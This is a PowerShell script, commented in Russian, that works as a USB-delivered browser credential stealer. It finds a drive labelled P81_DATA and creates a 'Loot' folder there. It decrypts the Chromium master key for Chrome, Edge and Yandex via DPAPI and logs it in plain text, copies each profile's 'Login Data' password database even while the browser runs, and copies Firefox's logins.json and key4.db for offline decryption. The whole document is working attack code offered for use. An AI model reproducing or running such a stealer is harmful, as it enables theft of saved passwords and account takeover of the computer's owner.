# 1. Поиск флешки по метке P81_DATA
$u = (Get-Volume -FileSystemLabel "P81_DATA").DriveLetter
if (!$u) { exit }
$u = "$($u):"

# 2. Создание папки назначения
$dest = "$u\Loot_$(Get-Date -f HHmm)"
cmd /c "mkdir $dest 2>nul"
$logPath = "$dest\REPORT.txt"

# Подгружаем сборку для работы с DPAPI
Add-Type -AssemblyName System.Security

# Функция для дешифровки ключа Chromium
function Get-Key($statePath, $label, $destDir) {
    if (Test-Path $statePath) {
        try {
            $json = Get-Content $statePath -Raw | ConvertFrom-Json
            $rawBytes = [Convert]::FromBase64String($json.os_crypt.encrypted_key)
            $encKey = $rawBytes[5..($rawBytes.Length-1)]
            
            # Дешифровка мастер-ключа через системный DPAPI
            $masterKey = [System.Security.Cryptography.ProtectedData]::Unprotect($encKey, $null, [System.Security.Cryptography.DataProtectionScope]::CurrentUser)
            $base64Key = [Convert]::ToBase64String($masterKey)
            
            "[$label] Master Key: $base64Key" >> "$destDir\REPORT.txt"
            return $true
        } catch { 
            "[$label] Key Error: $($_.Exception.Message)" >> "$destDir\REPORT.txt"
            return $false 
        }
    }
    return $false
}

# 3. СБОР CHROMIUM (Chrome, Edge, Yandex)
$browsers = @(
    @{name="Chrome"; path="Google\Chrome\User Data"},
    @{name="Edge"; path="Microsoft\Edge\User Data"},
    @{name="Yandex"; path="Yandex\YandexBrowser\User Data"}
)

foreach ($b in $browsers) {
    $userDataPath = Join-Path $env:LOCALAPPDATA $b.path
    if (Test-Path $userDataPath) {
        # Поиск всех файлов "Login Data" во всех профилях
        $foundFiles = Get-ChildItem -Path $userDataPath -Recurse -Filter "Login Data" -ErrorAction SilentlyContinue
        foreach ($file in $foundFiles) {
            $profileName = $file.Directory.Name
            $localState = Join-Path $userDataPath "Local State"
            $label = "$($b.name)_$($profileName)"
            
            if (Get-Key $localState $label $dest) {
                # Копирование базы через xcopy (флаг /y подтверждает замену, /q скрывает вывод)
                # Это позволяет копировать файлы, даже если браузер запущен
                cmd /c "xcopy /y /q `"$($file.FullName)`" `"$dest\$($label)_db`""
            }
        }
    }
}

# 4. СБОР FIREFOX (Файлы для офлайн-дешифровки)
$ffPath = "$env:APPDATA\Mozilla\Firefox\Profiles"
if (Test-Path $ffPath) {
    cmd /c "mkdir $dest\FF 2>nul"
    Get-ChildItem -Path $ffPath -Directory | ForEach-Object {
        $label = $_.Name
        $files = @("logins.json", "key4.db", "cert9.db")
        foreach ($f in $files) {
            $src = Join-Path $_.FullName $f
            if (Test-Path $src) {
                cmd /c "copy /y `"$src`" `"$dest\FF\$($label)_$f`""
            }
        }
        "[$label] Firefox profile files copied." >> $logPath
    }
}

exit
